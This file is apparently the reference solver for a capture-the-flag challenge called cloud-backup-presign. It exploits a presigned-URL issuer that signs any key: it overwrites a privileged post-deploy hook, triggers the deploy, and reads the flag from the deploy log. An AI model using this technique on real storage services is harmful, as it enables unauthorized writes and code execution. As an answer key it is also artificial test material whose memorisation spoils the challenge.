#!/usr/bin/env python3
"""Reference solver for cloud-backup-presign.

The presign issuer signs any key, not just uploads/. Presign a PUT for the
privileged hooks/postdeploy object, write the emit-flag sentinel, trigger the
deploy step, then read the artifact it publishes.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, method="GET", data=None):
    req = urllib.request.Request(url, data=data, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    # 1) presign a PUT for a key we should never be allowed to sign
    url = _req(base + "/presign?key=hooks/postdeploy")["url"]
    # 2) write the sentinel the deploy worker trusts
    _req(base + url, method="PUT", data=b"emit-flag")
    # 3) run the post-deploy step
    _req(base + "/deploy")
    # 4) read back the artifact it published
    body = _req(base + "/get?key=artifacts/deploy.log")["body"]
    return body.split("ran: ", 1)[1].strip()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
